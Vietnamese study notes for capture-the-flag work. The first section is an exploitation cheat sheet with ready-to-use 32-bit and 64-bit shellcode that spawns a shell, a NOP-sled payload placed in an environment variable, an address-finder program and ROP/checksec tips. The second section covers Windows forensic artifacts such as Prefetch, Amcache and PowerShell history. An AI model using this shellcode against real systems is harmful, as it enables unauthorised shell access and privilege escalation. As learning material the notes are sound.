# SHELLCODE
Biến môi trường
- export USERNAME=`perl -e 'print "\x90"x30,"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80","\x90"x30'`

Không biến môi trường 
```
shellcode32bit = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
shellcode64bit= b'\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'
```
Tìm địa chỉ của biến môi trường 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char * argv[]) {
        char * ptr;
        if(argc<3){
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]);
        ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  
        printf("%s will be at %p\n", argv[1], ptr);
}
```
Tìm pop rdi ;ret
ROPgadget --binary ./chall --only "pop rdi"

fgets : dùng p64(win) 
scanf: dùng str(win).encode

## checksec
- NX 
1. enable :(stack không thể thực thi mã.không thể chèn shellcode và ret vào ) sử dụng ROP hoặc ret2libc
2. disable: stack có thể thực thi có thể đưa shellcode vào 
- PIE
1. enable: binary được load ở địa chỉ ngẫu nhiên cần phải leak địa chỉ bằng kĩ thuật khác 
2. disable: binary có địa chỉ cố định 
- Canary
1. No canary: overflow
2. canary found: cần leak canary





# Foren

## I. TƯ DUY THU THẬP BẰNG CHỨNG (TRIAGE VS FULL IMAGE)
Trong điều tra hiện đại, thay vì sao chép toàn bộ ổ cứng (Full Disk Image) mất hàng giờ, các điều tra viên sử dụng phương pháp **Triage (Thu thập nhanh)** thông qua các công cụ như **KAPE**.
* **Nguyên lý:** Chỉ nhắm vào các "chủng loại tệp" chứa lịch sử hệ thống, log, registry, dữ liệu trình duyệt... (những tệp có dung lượng nhỏ nhưng giá trị điều tra cao).
* **Hệ quả:** Thường bỏ qua các tệp thực thi (`.exe`, `.dll`) hoặc dữ liệu cá nhân nặng nề. Do đó, điều tra viên phải dựa vào *dấu vết để lại* (như Hash, Prefetch) thay vì tìm tệp vật lý.

---

## II. CÁC "NHÂN CHỨNG SỐ" (ARTIFACTS) CỐT LÕI TRÊN WINDOWS

### 1. Prefetch (`.pf`) - Bằng chứng thực thi
* **Vị trí:** `C:\Windows\Prefetch\`
* **Bản chất:** Tính năng nạp trước của Windows giúp ứng dụng khởi động nhanh hơn. Mỗi khi một ứng dụng chạy, một tệp `.pf` được tạo ra.
* **Giá trị điều tra (Lý thuyết):**
  * Chứng minh một tệp **đã thực sự được chạy** (không chỉ nằm trên ổ cứng).
  * Cung cấp **Đường dẫn tuyệt đối** (File path) tại thời điểm tệp được thực thi.
  * Ghi lại **Số lần chạy** (Run count) và **Thời gian chạy cuối cùng** (Last run time).
  * Chứa danh sách các tệp/thư viện (DLLs) mà ứng dụng đã chạm vào trong 10 giây đầu tiên khởi chạy.
* **Công cụ phân tích:** `PECmd.exe` (Eric Zimmerman).

### 2. Amcache (`Amcache.hve`) - Dấu vân tay của ứng dụng
* **Vị trí:** `C:\Windows\AppCompat\Programs\Amcache.hve`
* **Bản chất:** Một tệp Registry của Windows dùng để lưu trữ thông tin về các ứng dụng nhằm phục vụ tính năng tương thích hệ điều hành.
* **Giá trị điều tra (Lý thuyết):**
  * Lưu trữ thông tin của tệp ngay cả khi tệp đã bị xóa khỏi hệ thống.
  * Quan trọng nhất: Cung cấp **Mã băm SHA1** của tệp thực thi gốc. Nhờ có Amcache, ta có thể tìm ra mã độc là gì dù tệp mã độc đã biến mất.
  * Ghi nhận thời gian ứng dụng được cài đặt/chạy lần đầu.
* **Công cụ phân tích:** `AmcacheParser.exe`, RegRipper (`rip.pl`), hoặc dùng lệnh `strings` để cạo dữ liệu thô.

### 3. LNK Files (Shortcut) & Thư mục Recent - Sự tương tác của người dùng
* **Vị trí:** `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Recent\`
* **Bản chất:** Các tệp lối tắt (`.lnk`) do người dùng chủ động tạo hoặc Windows tự động sinh ra khi một tệp được mở.
* **Giá trị điều tra (Lý thuyết):**
  * Chứng minh **Sự tương tác của con người** (có thao tác click mở tệp).
  * Chứa siêu dữ liệu quan trọng: Đường dẫn trỏ tới tệp gốc, thông tin về ổ đĩa, và cả địa chỉ MAC của máy tính đã tạo ra file LNK đó.

### 4. PowerShell History - Dấu vết của Hacker
* **Vị trí:** `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
* **Bản chất:** Tệp văn bản lưu lại toàn bộ các câu lệnh mà người dùng/hacker đã gõ vào cửa sổ PowerShell.
* **Giá trị điều tra (Lý thuyết):**
  * Hiển thị trực tiếp các hành vi tải mã độc (vd: lệnh `curl`, `wget`, `Invoke-WebRequest` / `iwr`).
  * Tiết lộ các nguồn tải payload (Pastebin, Github...).
  * Phát hiện kỹ thuật lẩn tránh (Evasion): Kẻ tấn công thường mã hóa lệnh bằng Base64 (tham số `-e` hoặc `-EncodedCommand`).

### 5. Cơ sở dữ liệu SQLite (Ví dụ: Sticky Notes)
* **Vị trí (Sticky Notes):** `...\Packages\Microsoft.MicrosoftStickyNotes_...\LocalState\plum.sqlite`
* **Bản chất:** Rất nhiều ứng dụng Windows 10/11 lưu dữ liệu dưới dạng cơ sở dữ liệu SQLite.
* **Giá trị điều tra (Lý thuyết):** Ngay cả khi người dùng xóa dữ liệu trên giao diện ứng dụng, dữ liệu văn bản thường vẫn còn tồn tại (chưa bị ghi đè) bên trong tệp `.sqlite`. Có thể truy xuất bằng các công cụ đọc Database.

---

## III. PHƯƠNG PHÁP LUẬN & KỸ THUẬT PHÂN TÍCH

### 1. Kỹ thuật "Phát hiện bất thường vị trí" (Location Anomaly)
* **Lý thuyết:** Các phần mềm hệ thống hợp lệ (như `calculator.exe`, `svchost.exe`) LUÔN LUÔN chạy từ các thư mục cốt lõi (như `C:\Windows\System32`). 
* **Ứng dụng:** Nếu Prefetch, Amcache hoặc Event Log báo cáo một tệp có tên hệ thống nhưng lại chạy từ thư mục cá nhân như `C:\Users\...\AppData\Local\` hoặc `Temp`, đó là dấu hiệu 99% của mã độc (Malware/Imposter) vì các thư mục này cho phép ghi/thực thi không cần quyền Admin.

### 2. Kỹ thuật Trích xuất dữ liệu thô (Data Scraping) với Linux
* **Lý thuyết:** Khi không có công cụ parse chuyên dụng, hoặc cần trích xuất nhanh một loại dữ liệu cụ thể (như Hash, IP, URL) từ một tệp nhị phân/registry bị mã hóa ký tự (như UTF-16LE).
* **Ứng dụng:** Kết hợp sức mạnh của Command Line Linux:
  * `strings -e l <file>`: Đọc các chuỗi văn bản (có định dạng UTF-16) ẩn trong tệp nhị phân.
  * `grep -ioE '\b[a-f0-9]{40}\b'`: Dùng Regex (Biểu thức chính quy) để "lọc" chính xác các chuỗi có định dạng của mã SHA1.

